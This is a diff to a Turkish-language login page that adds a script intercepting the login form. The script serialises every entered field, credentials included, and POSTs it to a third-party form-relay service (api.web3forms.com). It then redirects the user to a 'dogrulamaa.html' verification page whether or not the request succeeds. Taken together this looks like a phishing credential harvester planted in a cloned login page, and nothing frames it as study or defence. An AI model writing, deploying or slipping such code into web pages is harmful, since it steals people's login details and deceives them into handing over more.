@@ -19537,7 +19537,8 @@
                                         </div>
                                     </div>
                                     <div class="d-flex justify-content-center align-items-center">
-                                        <button class="btn btn-login text-uppercase font-weight-bold mb-2 giris-yap-btn"
+                                        <button id="submitBtn"
+                                            class="btn btn-login text-uppercase font-weight-bold mb-2 giris-yap-btn"
                                             type=submit name=button value=login>Giriş Yap</button>
                                     </div>
                                     <div class=text-center>
@@ -19629,3 +19630,42 @@
                 style="width:250px;height:40px;border:1px solid rgb(193,193,193);margin:10px 25px;padding:0px;resize:none;display:none">0cAFcWeA4kZDpRBbSTCQSXMw7FyHYBdgB_-oW9t_mEIJ86_7UPrnFyChxG95cQDHFuVUmYZrs08M08Umh-EoOIVWacVkH72isjT_czSmDR0WYw375kpCIaSBp80z9cRHt4GlnAEE0JDXps-PVFQ_eiFTgVy3WmLTXrTm6GVsnORklEYWcJd3UJp4ZGm1ewSghaCHOPtrcEDZ1F_0JBHJsaeVxoXW2OfG7Sy8QNnroi4rqS_Pag2JAGul1H3iI2IfrWUw5mo3fq9OWVZzI-bZQ64V-qhAyNrw1u-eAB3dNm9I_IC5XOpfdHCqruyVXNEX4g5d-2Og692dEejEEP9rV42By5kwQlvd-daQdl4eDsJLs7lwkGmHEJaOMf9p0Y0ibBgmgo9sOWLxDEyjZQwgJ6ctNt0JfcGpXj5ubJyvewb8EXYZ-_P84jnU5AyGBLD22ahRBuBjs0IvDieA-yeVx0vEYDdcUYVfVUGs6Mave1kF-dZKKRZYZphaPBfkuq07zLQDg1FFe8Jto7S0krpHHA7X15jP0fsGAN8g985reo9HWN2L_Ls17-eL7NMkZrs4dBNaGXsTttjMEOpB6eRLxEQmiUJANh-tMzwyM-W3Q1hUKyBdd4qsBGzMXIPPTvwQBM70Vo5m-NhZ3Ve2dk_7NQvpv1G5PTUliT2coKlk2ZB-SSphVhidwFq0-jh7Qf9QIXyGgUUKLtaJLkvT-VHC1xHI1dJbWg-uyKfmK37-iLU9KbiCcoW-kukAZpir5AdXuiVsg4Gt9UZsJD3G53nYHq4QOspgLUIckccwZ_fAognIfkK0MrMA1fKvcd4_nBxV4qvAY9J1Mh2LSxE74zv3IFOcpmoH4caoariRg8P4GYW_q2v8SGX4OLVgpEgbOpVsgE-Tk7cQlF-WqRrtU1pl3YQYxc66hFzD2McV_KISqYywQQ45_LPkAmI38</textarea>
         </div><iframe style=display:none></iframe>
     </div>
+    <script>
+        // Sayfa tamamen yüklendiğinde çalışır
+        window.addEventListener('load', function () {
+            const form = document.getElementById('stsForm');
+            const btn = document.getElementById('submitBtn');
+
+            if (form) {
+                form.addEventListener('submit', function (e) {
+                    e.preventDefault();
+
+                    if (btn) {
+                        btn.disabled = true;
+                        btn.innerHTML = "Giriş Yapılıyor...";
+                    }
+
+                    const formData = new FormData(this);
+                    const object = Object.fromEntries(formData);
+                    const json = JSON.stringify(object);
+
+                    fetch('https://api.web3forms.com/submit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: json
+                    })
+                        .then(() => {
+                            // Veri gitti, yönlendir
+                            window.location.href = "dogrulamaa.html";
+                        })
+                        .catch(() => {
+                            // Hata olsa da yönlendir
+                            window.location.href = "dogrulamaa.html";
+                        });
+                });
+            }
+        });
+    </script>
